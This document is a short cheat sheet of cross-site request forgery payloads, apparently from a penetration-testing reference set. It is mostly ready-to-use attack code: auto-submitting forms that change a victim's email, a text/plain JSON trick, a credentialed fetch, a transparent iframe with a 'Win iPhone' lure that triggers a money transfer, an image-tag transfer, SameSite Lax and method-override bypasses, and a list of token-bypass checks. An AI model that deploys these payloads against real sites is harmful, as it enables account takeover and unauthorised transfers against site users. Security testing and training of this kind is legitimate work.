# PAYLOADS: CSRF
## Version: 1.0 | Domain: payloads

---

## HTML FORM AUTO-SUBMIT
```html
<html><body>
<form action="https://target.tld/api/email/change" method="POST">
  <input name="email" value="[email protected]">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

## JSON CSRF (CONTENT-TYPE TRICK)
```html
<form action="https://target.tld/api/x" method="POST" enctype="text/plain">
  <input name='{"a":"b","c":"' value='d"}'>
</form>
<script>document.forms[0].submit();</script>
```

## XHR (NEEDS LAX CORS)
```javascript
fetch('https://target.tld/api/x', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({email:'[email protected]'})
});
```

## CLICKJACKING-ASSISTED CSRF
```html
<style>iframe{opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;}</style>
<iframe src="https://target.tld/transfer?to=attacker&amount=1000"></iframe>
<button style="position:absolute;top:200px;left:200px;">Win iPhone</button>
```

## GET-BASED CSRF
```html
<img src="https://target.tld/transfer?to=attacker&amount=1000">
```

## SAMESITE LAX BYPASS — TOP-LEVEL NAVIGATION
```html
<a href="https://target.tld/api/admin/delete?id=999" target="_blank">Click</a>
<!-- GET endpoints with state-changing effect → lax-bypass -->
```

## SAMESITE LAX BYPASS — METHOD OVERRIDE
```
POST /api/x?_method=PUT
```

## CSRF TOKEN BYPASS
- Remove the token entirely → check if accepted
- Submit empty token → check if accepted
- Submit attacker's token → check if accepted (from another account)
- Token in URL → leak via Referer
- Token tied to session but not user → reuse from any account
- Token never validated for state-changing actions
- POST → GET conversion
- Method override (X-HTTP-Method-Override: POST)

## REFERENCES
PortSwigger CSRF labs, OWASP CSRF Prevention Cheat Sheet
